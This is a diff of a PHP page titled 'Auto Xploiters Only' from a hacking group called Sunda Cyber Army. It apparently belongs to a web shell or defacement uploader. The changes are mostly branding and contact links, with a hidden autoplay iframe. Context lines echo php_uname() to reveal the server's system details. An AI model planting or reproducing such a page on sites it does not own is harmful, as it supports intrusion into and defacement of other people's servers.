@@ -1,15 +1,12 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
-<title> # Auto Xploiters Only | SCA 2k17 ~ </title>
+<title> # Auto Xploiters Only | SCA </title>
 <link rel="icon" type="image/jpg" href='https://seken.co.id/assets/uploads/post/Monkey-de-Luffy-One-Piece-81.jpg'/>
-<center><h1><i><font color="blue"> # SUNDA CYBER ARMY </font></i></h1></center>
-<center><img border="0" src="https://seken.co.id/assets/uploads/post/Monkey-de-Luffy-One-Piece-81.jpg" width="250" height="">
-<center><h2><i><font color="blue"> aseppebriana142@gmail.com !</font></i></h2></center>
-<center><h2><i><font color="blue"> -=> https://www.xploiters77.ml <=-</font></i></h2></center>
-<center><h2><i><font color="blue"> -=> https://www.sundacyberarmy77.tk <=- </font></i></h2></center>
-<center><h2><i><font color="blue"> -=> http://www.xploiters77.6te.net <=- !</font></i></h2></center>
-<center><h2><i><font color="blue"> -=> YT : Sunda Cyber Army <=- </font></i></h2></center>
-<center><h2><i><font color="blue"> -=> FP : https://www.facebook.com/SundaCyberArmy/</font></i></h2></center>
-<iframe width="0%" height="0" scrolling="no" frameborder="no" loop="true" allow="autoplay" src="https://d.top4top.net/m_10932vbu71.mp3"></iframe>
+<center><h1><b><font color="blue"> { SUNDA CYBER ARMY } </font></b></h1></center>
+<center><img border="0" src="https://seken.co.id/assets/uploads/post/Monkey-de-Luffy-One-Piece-81.jpg" width="300" height="250">
+<pre><hr><center><h2><i><font color="blue"> -= > sundacyberarmy@gmail.com | https://www.xploiters77.ml | http://www.xploiters77.cf <=- </font></i></h2></hr></pre> 
+<pre><hr><center><h2><i><font color="blue"> -=> Channel Youtube : Sunda Cyber Army | Fanspage : https://www.facebook.com/SundaCyberArmy/ <=- </font></i></h2></center></hr></pre>
+<hr><center><h2><i><font color="blue"> -=> Github : https://github/MrdSca <=- </font></i></h2></center></hr>
+<hr><iframe width="0%" height="0" scrolling="no" frameborder="no" loop="true" allow="autoplay" src="https://d.top4top.net/m_10932vbu71.mp3"></iframe></hr>
 <?php
  
 ?>
@@ -93,7 +90,7 @@ echo '<br> Dasar Heiker :v !<br>';
 ?></center>
 <br><center><a Style='font-size:30px;'>Auto Xploiters Only </b></center> 
 <center><a Style='font-size:15px;'>Sunda Cyber Army | 2K17 </a></center> 
-<center><a Style='font-size:15px;'>www.Facebook.com/SundaCyberArmy/</a></center> 
+<center><a Style='font-size:15px;'>www.facebook.com/SundaCyberArmy/</a></center> 
 <? echo "".php_uname()."<br>"; ?>
 <center><a Style='font-size:15px;'># Squad Sunda Sareng Urang Tiasa ~ </a></center>
 <?  
